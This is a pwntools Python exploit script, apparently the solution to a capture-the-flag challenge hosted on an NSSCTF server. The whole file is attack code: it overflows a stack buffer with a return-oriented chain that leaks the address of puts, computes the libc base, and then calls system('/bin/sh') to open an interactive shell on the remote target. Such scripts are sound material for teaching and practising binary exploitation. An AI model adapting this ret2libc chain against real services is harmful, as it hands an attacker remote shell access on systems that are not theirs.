from pwn import *


io = remote('node1.anna.nssctf.cn',28599)
# io=process("./pwn")
elf = ELF('./attachment')
libc= ELF('./libc.so.6')

io.sendline(b'7')
io.recv()
io.sendline(b'1000000')
io.recv()
io.sendline(b'5')

ret_add =0x0000000000400579
pop_rdi =0x0000000000400d73
main_add =0x0000000000400B1E
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

print("Puts_got: ",hex(puts_got))
print("Puts_plt: ",hex(puts_plt))

offset=0x40

payload1 = b'a' * (offset+8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_add)
io.sendlineafter(b'it!!!', payload1)
puts_addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
print("Puts_addr: ",hex(puts_addr))

# libc = LibcSearcher('puts',puts_addr)   # libc6_2.27-0ubuntu2_amd64

# libc_base = puts_addr - libc.dump('puts')
# system_add = libc_base + libc.dump('system')
# bin_sh_add = libc_base + libc.dump('str_bin_sh')

libc_base = puts_addr - libc.symbols['puts']
system_add = libc_base + libc.symbols['system']
bin_sh_add = libc_base + next(libc.search(b'/bin/sh'))

payload2 = b'a' * (offset+8) + p64(ret_add) + p64(pop_rdi) + p64(bin_sh_add) + p64(system_add)

io.sendlineafter(b'it!!!', payload2)

io.interactive()